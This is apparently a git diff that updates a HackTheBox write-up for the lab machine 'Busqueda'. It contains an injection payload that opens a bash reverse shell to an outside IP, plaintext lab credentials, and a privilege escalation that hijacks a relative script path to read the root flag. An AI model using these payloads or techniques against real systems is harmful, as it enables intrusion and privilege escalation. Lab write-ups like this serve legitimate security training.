@@ -1,11 +1,11 @@
 ---
 title: Busqueda
-published: 2024-08-05
+published: 2024-08-06
 description: Writeup for an easy labeled linux based HTB machine named Busqueda.
-# image: ./devvortex/devvortex_pwned.jpg
+image: ./busqueda/busqueda_pwned.png
 tags: [HackTheBox, Linux, Machines]
 category: Writeups
-draft: true
+draft: false
 ---
 
 # <center> Busqueda </center>
@@ -72,6 +72,7 @@ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - `sudo -l` reveals
 
 ### Playing with input field (alternative method) 
+- SSTI
 - payload: 
 ```python
 ,),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.41/1234 0>&1"')#
@@ -88,9 +89,18 @@ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - `ls -al` -> gind .git -> `cd .git` -> `ls` -> config file -> `cat config`
 url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
 
-May be ssh id ?? cody:jh1usoih2bkjaspwe92
+- May be ssh id ?? cody:jh1usoih2bkjaspwe92
+- new domain: gitea.searcher.htb. Let's add it as well to /etc/hosts and check the web.
+  ![new website at gitea.searcher.htb](./busqueda/new_website.png)
 
+- let's login with the above credentials for cody.
+![logged in as cody](./busqueda/loggedin_cody.png)
+
+- nothing much interesting in website for this user.(another use `administrator` is also present but we don't have access to it right now.)
+  
 <hr>
+Let's check for ssh.
+
 - target 1 : ssh login -> cody:jh1usoih2bkjaspwe92 ==> permission denied
 - target 2 : ssh login -> svc:jh1usoih2bkjaspwe92  ==> logged in
     - thus creds for svc is svc:jh1usoih2bkjaspwe92
@@ -100,3 +110,128 @@ May be ssh id ?? cody:jh1usoih2bkjaspwe92
 - `sudo -l` -> (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 
 - `sudo pyhton3 /opt/sccripts/system-checkup.py *`
+
+```bash
+-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+```
+---
+Running docker-ps
+```bash
+-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS        PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   19 months ago   Up 17 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   19 months ago   Up 17 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+```
+-> two conatainers gitea and mysql_db are up.
+
+---
+Running docker-inspect
+```bash
+-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
+Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
+```
+
+-> need to pass a format and container name as well. 
+
+```bash
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
+```
+![gitea admin password](./busqueda/gitea_admin_pass.png)
+
+- couldnot login to mysql with this credentials.
+- try for administrator user in gitea.searcher.htb. -> successfully logged in
+![loggedin as administrator](./busqueda/loggedin_admin.png)
+
+- In scripts repository, we can find system-checkup.py script whic could be run as sudo by us on the server.
+```bash
+#!/bin/bash
+import subprocess
+import sys
+
+actions = ['full-checkup', 'docker-ps','docker-inspect']
+
+def run_command(arg_list):
+    r = subprocess.run(arg_list, capture_output=True)
+    if r.stderr:
+        output = r.stderr.decode()
+    else:
+        output = r.stdout.decode()
+
+    return output
+
+
+def process_action(action):
+    if action == 'docker-inspect':
+        try:
+            _format = sys.argv[2]
+            if len(_format) == 0:
+                print(f"Format can't be empty")
+                exit(1)
+            container = sys.argv[3]
+            arg_list = ['docker', 'inspect', '--format', _format, container]
+            print(run_command(arg_list)) 
+        
+        except IndexError:
+            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
+            exit(1)
+    
+        except Exception as e:
+            print('Something went wrong')
+            exit(1)
+    
+    elif action == 'docker-ps':
+        try:
+            arg_list = ['docker', 'ps']
+            print(run_command(arg_list)) 
+        
+        except:
+            print('Something went wrong')
+            exit(1)
+
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+            
+
+if __name__ == '__main__':
+
+    try:
+        action = sys.argv[1]
+        if action in actions:
+            process_action(action)
+        else:
+            raise IndexError
+
+    except IndexError:
+        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
+        print('')
+        print('     docker-ps     : List running docker containers')
+        print('     docker-inspect : Inpect a certain docker container')
+        print('     full-checkup  : Run a full system checkup')
+        print('')
+        exit(1)
+```
+
+- for full checkup, the script is using relative path to search `full-checkup.py`. We can exploit it by creating our own file with malicious code and name it as `full-checkup.sh` and then run the python program.
+
+```bash
+#!/bin/bash
+cat /root/root.txt
+```
+- this code will directly give me the root flag without having to do much of work. let's try it.
+
+![root flag](./busqueda/root_pass.png)
+
+voila. we got the root flag.
+
+## Hope you all liked it. Thankyou.
